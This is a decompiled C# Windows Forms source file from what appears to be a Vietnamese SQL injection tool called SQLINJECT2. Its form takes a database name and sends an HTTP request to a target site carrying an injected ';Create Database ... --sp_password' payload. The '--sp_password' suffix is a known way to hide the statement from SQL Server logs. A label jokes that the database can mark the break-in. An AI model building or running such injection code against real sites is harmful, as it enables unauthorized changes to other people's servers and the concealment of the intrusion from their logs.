using System;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Net;
using System.Windows.Forms;

namespace SQLINJECT2;

public class CreateDBForm : Form
{
	private IContainer components = null;

	private Button button1;

	private Label label1;

	private TextBox textBox1;

	private Button button2;

	private Label label2;

	private string weblink;

	private string thongbao1 = "value '";

	private string thongbao2 = "' to";

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0011: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		//IL_003d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0047: Expected O, but got Unknown
		//IL_02da: Unknown result type (might be due to invalid IL or missing references)
		//IL_02e4: Expected O, but got Unknown
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(CreateDBForm));
		button1 = new Button();
		label1 = new Label();
		textBox1 = new TextBox();
		button2 = new Button();
		label2 = new Label();
		((Control)this).SuspendLayout();
		((Control)button1).set_Location(new Point(85, 49));
		((Control)button1).set_Name("button1");
		((Control)button1).set_Size(new Size(75, 23));
		((Control)button1).set_TabIndex(0);
		((Control)button1).set_Text("Tạo");
		((ButtonBase)button1).set_UseVisualStyleBackColor(true);
		((Control)button1).add_Click((EventHandler)button1_Click);
		((Control)label1).set_AutoSize(true);
		((Control)label1).set_Location(new Point(-2, 27));
		((Control)label1).set_Name("label1");
		((Control)label1).set_Size(new Size(81, 13));
		((Control)label1).set_TabIndex(1);
		((Control)label1).set_Text("Tên Database :");
		((Control)textBox1).set_Location(new Point(85, 20));
		((Control)textBox1).set_Name("textBox1");
		((Control)textBox1).set_Size(new Size(195, 20));
		((Control)textBox1).set_TabIndex(2);
		((Control)button2).set_Location(new Point(205, 49));
		((Control)button2).set_Name("button2");
		((Control)button2).set_Size(new Size(75, 23));
		((Control)button2).set_TabIndex(3);
		((Control)button2).set_Text("Close");
		((ButtonBase)button2).set_UseVisualStyleBackColor(true);
		((Control)button2).add_Click((EventHandler)button2_Click);
		((Control)label2).set_AutoSize(true);
		((Control)label2).set_Location(new Point(-4, 93));
		((Control)label2).set_Name("label2");
		((Control)label2).set_Size(new Size(301, 26));
		((Control)label2).set_TabIndex(4);
		((Control)label2).set_Text("Chức năng của Form này là tạo mới 1 Database , còn tạo để\r\nlàm gì thì tùy các bạn :D có thể tạo để ghi dấu ấn chẳng hạn .");
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(292, 137));
		((Control)this).get_Controls().Add((Control)(object)label2);
		((Control)this).get_Controls().Add((Control)(object)button2);
		((Control)this).get_Controls().Add((Control)(object)textBox1);
		((Control)this).get_Controls().Add((Control)(object)label1);
		((Control)this).get_Controls().Add((Control)(object)button1);
		((Form)this).set_Icon((Icon)componentResourceManager.GetObject("$this.Icon"));
		((Control)this).set_MaximumSize(new Size(300, 164));
		((Control)this).set_MinimumSize(new Size(300, 164));
		((Control)this).set_Name("CreateDBForm");
		((Control)this).set_Text("Tạo mới Database");
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}

	public CreateDBForm()
	{
		InitializeComponent();
	}

	private bool GetHtmlSource(out string responseString, Uri requestURI)
	{
		HttpWebResponse httpWebResponse = null;
		WebProxy proxy = null;
		Stream stream = null;
		MemoryStream memoryStream = null;
		MemoryStream memoryStream2 = null;
		bool result = false;
		responseString = "";
		requestURI = null;
		try
		{
			HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create(weblink);
			httpWebRequest.Accept = "*/*";
			httpWebRequest.Headers.Add("Accept-Language", "en-us");
			httpWebRequest.UserAgent = "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.7) Gecko/20050414 Firefox/1.0.3";
			httpWebRequest.Method = "GET";
			httpWebRequest.AllowAutoRedirect = true;
			httpWebRequest.Proxy = proxy;
			httpWebRequest.Timeout = (int)new TimeSpan(0, 0, 60).TotalMilliseconds;
			try
			{
				httpWebResponse = (HttpWebResponse)httpWebRequest.GetResponse();
				_ = httpWebResponse.CharacterSet;
				stream = httpWebResponse.GetResponseStream();
				result = true;
			}
			catch (WebException ex)
			{
				result = false;
				if (ex.Response == null)
				{
					stream = null;
					responseString = "<html><body>" + ex.Message + "</body></html>";
					return result;
				}
				stream = ex.Response!.GetResponseStream();
			}
			finally
			{
				requestURI = httpWebRequest.RequestUri;
			}
			if (stream != null)
			{
				memoryStream = new MemoryStream();
				memoryStream2 = new MemoryStream();
				Utilities.CopyStream(stream, memoryStream);
				memoryStream.Position = 0L;
				Utilities.CopyStream(memoryStream, memoryStream2);
				responseString = Utilities.GetStreamHTMLData(memoryStream, null, supportSeek: true);
			}
			return result;
		}
		catch (Exception)
		{
			return result;
		}
		finally
		{
			stream?.Close();
			memoryStream?.Close();
			memoryStream2?.Close();
		}
	}

	private void button2_Click(object sender, EventArgs e)
	{
		((Form)this).Close();
	}

	private void button1_Click(object sender, EventArgs e)
	{
		LoadForm loadForm = new LoadForm();
		((Control)loadForm).Show();
		Uri requestURI = null;
		string responseString = "";
		weblink = MainForm.address1 + ";Create Database " + ((Control)textBox1).get_Text() + "--sp_password" + MainForm.address2;
		GetHtmlSource(out responseString, requestURI);
		MainForm.load = 1;
	}
}
